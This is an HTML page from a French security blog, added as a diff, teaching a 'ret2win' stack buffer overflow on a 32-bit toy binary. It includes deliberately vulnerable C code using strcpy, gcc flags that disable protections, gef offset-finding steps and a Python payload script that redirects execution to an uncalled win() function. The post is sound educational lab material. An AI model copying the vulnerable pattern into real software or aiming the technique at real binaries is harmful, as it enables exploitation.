@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    
+      <title>Ret2win 32bits ! :: RedFou52 - BlogPost — Bienvenue sur mon BlogPost</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Qu&amp;rsquo;est ce qu&amp;rsquo;un Ret2Win ? Un ret2win fonctionne de la même manière qu&amp;rsquo;un buffer overflow à la différence qu&amp;rsquo;il n&amp;rsquo;y aura pas de shellcode ici !
+Le but d&amp;rsquo;un ret2win est d&amp;rsquo;appeler une fonction du programme qui n&amp;rsquo;est jamais appeler une seule fois dans le code du programme.
+Dans ce tutoriel je vais vous montrer comment exécuter un exploit ret2win sur un binaire 32bits.
+Ret2win 32bits Code Voici le code du programme que nous alons exploiter :"/>
+<meta name="keywords" content="linux, tuto, programmation, python"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/fr/binary/5-ret2win/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Ret2win 32bits !"/>
+<meta name="twitter:description" content="Exploitation d&#39;une ret2win sur un binaire 32bits"/>
+
+
+
+<meta property="og:title" content="Ret2win 32bits !" />
+<meta property="og:description" content="Exploitation d&#39;une ret2win sur un binaire 32bits" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/fr/binary/5-ret2win/" />
+<meta property="article:published_time" content="2020-09-15T10:11:22+02:00" />
+<meta property="article:modified_time" content="2020-09-15T10:11:22+02:00" /><meta property="og:site_name" content="RedFou52 - BlogPost" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">RedFou52 - BlogPost</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+
+
+
+    <span class="header__right">
+      
+        <nav class="menu">
+	<ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+	<li><a href="/fr/tuto">Les Tutos</a></li>
+        
+      
+        
+	<li><a href="/fr/secu">Sécurité</a></li>
+        
+      
+        
+	<li><a href="/fr/writeup">Write-Up</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            Voir la suite
+            <span class="menu__sub-inner-more-trigger-icon"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+          </li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+	      <li><a href="/fr/binary">Exploit-Binaire</a></li>
+              
+            
+              
+	      <li><a href="/fr/raspberry">Raspberry</a></li>
+              
+            
+              
+	      <li><a href="/fr/nixos">NIXOS</a></li>
+              
+            
+              
+	      <li><a href="/fr/arch">Archlinux</a></li>
+              
+            
+              
+	      <li><a href="/fr/ml">MachineLearning</a></li>
+              
+            
+              
+	      <li><a href="/fr/about">A propos !</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/fr/tuto">Les Tutos</a></li>
+      
+    
+      
+        <li><a href="/fr/secu">Sécurité</a></li>
+      
+    
+      
+        <li><a href="/fr/writeup">Write-Up</a></li>
+      
+    
+      
+        <li><a href="/fr/binary">Exploit-Binaire</a></li>
+      
+    
+      
+        <li><a href="/fr/raspberry">Raspberry</a></li>
+      
+    
+      
+        <li><a href="/fr/nixos">NIXOS</a></li>
+      
+    
+      
+        <li><a href="/fr/arch">Archlinux</a></li>
+      
+    
+      
+        <li><a href="/fr/ml">MachineLearning</a></li>
+      
+    
+      
+        <li><a href="/fr/about">A propos !</a></li>
+      
+    
+  </ul>
+</nav>
+
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/fr/binary/5-ret2win/">Ret2win 32bits !</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-09-15
+        </span>
+
+        
+      
+
+      <span class="post-author">— Ecrit par Eidorian</span>
+      
+    </div>
+
+    
+
+    
+      
+        <img src="/img/fr/binary/5-ret2win-binary.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      
+      <h1 id="quest-ce-quun-ret2win-">Qu&rsquo;est ce qu&rsquo;un Ret2Win ?</h1>
+<p>Un ret2win fonctionne de la même manière qu&rsquo;un buffer overflow à la différence qu&rsquo;il n&rsquo;y aura pas de shellcode ici !</p>
+<p>Le but d&rsquo;un ret2win est d&rsquo;appeler une fonction du programme qui n&rsquo;est jamais appeler une seule fois dans le code du programme.</p>
+<p>Dans ce tutoriel je vais vous montrer comment exécuter un exploit ret2win sur un binaire 32bits.</p>
+<h1 id="ret2win-32bits">Ret2win 32bits</h1>
+<h2 id="code">Code</h2>
+<p>Voici le code du programme que nous alons exploiter :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">win</span>(){
+    printf(<span style="color:#e6db74">&#34;FLAG[WIN_!]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">vulnerable</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argument){
+
+	<span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">100</span>];
+	strcpy(buffer,argument);
+	printf(<span style="color:#e6db74">&#34;Bonjour %s </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buffer);
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
+    vulnerable(argv[<span style="color:#ae81ff">1</span>]);
+    printf(<span style="color:#e6db74">&#34;Mhm ... Il manque une fonction !</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Si vous avez suivi le tuto sur les bufferoverflow, le code est presque le même.<br>
+La seule différence est l&rsquo;ajout d&rsquo;une fonction supplémentaire <code>win()</code> mais comme vous pouvez le voir, cette fonction n&rsquo;est jamais appelée dans le programme.</p>
+<h2 id="compilation">Compilation</h2>
+<p>Pour le compiler, on utilise <code>gcc</code> avec les options suivantes :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">しのぶ » gcc -m32 -fno-stack-protector -z execstack -o ret2win_32 ret2win_32.c -no-pie
+</code></pre></div><h2 id="padding">Padding</h2>
+<p>Premièrement, il nous faut trouver le padding pour remplir le registre EIP.</p>
+<p>Pour cela, on utilise un pattern avec <a href="https://github.com/hugsy/gef">gef</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  pattern create <span style="color:#ae81ff">150</span>
+</code></pre></div><p>Une fois le pattern créé on va l&rsquo;utiliser dans notre programme pour le faire planter :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
+</code></pre></div><p><img src="/img/fr/binary/5-eip-pattern.png" alt="5-eip-pattern.png"></p>
+<p>On récupère l&rsquo;offset présent dans EIP et on utilise la commande suivante pour trouver la taille de EIP :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  pattern search 0x62616164
+</code></pre></div><p><img src="/img/fr/binary/5-pattern-EIP-112.png" alt="5-pattern-EIP-112.png"></p>
+<p>Notre padding fera 112.</p>
+<h2 id="ret2win">ret2win</h2>
+<p>Maintenant, on va récupérer l&rsquo;adresse de la fonction <code>win()</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  p win
+</code></pre></div><p><img src="/img/fr/binary/5-adresse-win.png" alt="5-adresse-win.png"></p>
+<p>Nous sommes prêt pour notre exploit</p>
+<h2 id="exploit-">Exploit !</h2>
+<p>On va utiliser un script python pour générer notre payload :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">112</span>
+
+RET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x96\x91\x04\x08</span><span style="color:#e6db74">&#34;</span>
+
+payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> RET
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload.bin&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+    f<span style="color:#f92672">.</span>write(payload)
+
+
+</code></pre></div><p>Maintenant, on exécute notre exploit !</p>
+<p><img src="/img/fr/binary/5-win.png" alt="5-win.png"></p>
+<p>Voilà notre fonction a bien été appelée !</p>
+
+    </div>
+    
+
+
+    
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">@RedFou52 - Eidorian</div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
